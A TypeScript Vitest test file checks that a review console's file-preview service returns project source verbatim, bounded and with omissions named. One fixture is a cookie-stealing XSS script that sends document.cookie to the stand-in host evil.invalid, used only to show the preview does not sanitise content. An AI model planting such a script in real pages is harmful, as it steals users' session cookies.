/**
 * AKT 2 · PHASE 3 · U3.3 — the preview is TEXT, bounded, and honest about what
 * it left out.
 *
 * The safety property (nothing is executed or embedded) is a property of the
 * CONSUMER — the console renders these strings as React text children inside a
 * <pre>. What this file can and does test is the part that lives here: that the
 * service hands back the source verbatim rather than a sanitised, rewritten or
 * partially-rendered version of it, and that every omission is named.
 */

import { describe, it, expect, vi } from 'vitest';
import { loadCandidatePreview, MAX_PREVIEW_CHARS_PER_FILE, MAX_PREVIEW_FILES, type PreviewDeps } from './ops-review-preview';

function deps(files: Record<string, string>): PreviewDeps {
  return {
    listFiles: vi.fn(async () => Object.keys(files)),
    getFileBytes: vi.fn(async (_p: string, path: string) =>
      files[path] === undefined ? null : { bytes: Buffer.from(files[path]!, 'utf8') },
    ),
  };
}

describe('loadCandidatePreview', () => {
  it('returns the source VERBATIM — nothing sanitised, escaped or rewritten', async () => {
    const hostile = '<script>fetch("https://evil.invalid?c="+document.cookie)</script>';
    const p = await loadCandidatePreview('proj-1', deps({ 'index.html': hostile }));
    // An operator judging a page needs to see what is actually in it. A preview
    // that strips the script tag hides the exact thing the review is about.
    expect(p.files[0]?.text).toBe(hostile);
  });

  it('puts index.html first', async () => {
    const p = await loadCandidatePreview('proj-1', deps({ 'zzz.js': 'x', 'index.html': 'y', 'about.html': 'z' }));
    expect(p.files.map((f) => f.path)).toEqual(['index.html', 'about.html', 'zzz.js']);
  });

  it('names non-text files instead of trying to show them', async () => {
    const p = await loadCandidatePreview('proj-1', deps({ 'index.html': 'y', 'logo.png': 'binary' }));
    expect(p.binaryFiles).toEqual(['logo.png']);
    expect(p.files.map((f) => f.path)).toEqual(['index.html']);
  });

  it('truncates a long file and SAYS it truncated', async () => {
    const long = 'a'.repeat(MAX_PREVIEW_CHARS_PER_FILE + 10);
    const p = await loadCandidatePreview('proj-1', deps({ 'index.html': long }));
    expect(p.files[0]?.truncated).toBe(true);
    expect(p.files[0]?.text).toHaveLength(MAX_PREVIEW_CHARS_PER_FILE);
  });

  it('names the files it did not show rather than quietly stopping', async () => {
    const many: Record<string, string> = {};
    for (let i = 0; i < MAX_PREVIEW_FILES + 3; i++) many[`f${String(i).padStart(2, '0')}.js`] = 'x';
    const p = await loadCandidatePreview('proj-1', deps(many));
    expect(p.files).toHaveLength(MAX_PREVIEW_FILES);
    expect(p.omittedFiles).toHaveLength(3);
    expect(p.totalFiles).toBe(MAX_PREVIEW_FILES + 3);
  });

  it('reports UNAVAILABLE — not "empty" — when the project cannot be listed', async () => {
    const p = await loadCandidatePreview('proj-1', {
      listFiles: vi.fn(async () => { throw new Error('gone'); }),
      getFileBytes: vi.fn(async () => null),
    });
    expect(p.available).toBe(false);
    expect(p.files).toEqual([]);
  });

  it('reports UNAVAILABLE for a candidate with no project', async () => {
    const p = await loadCandidatePreview(null, deps({ 'index.html': 'y' }));
    expect(p.available).toBe(false);
  });
});
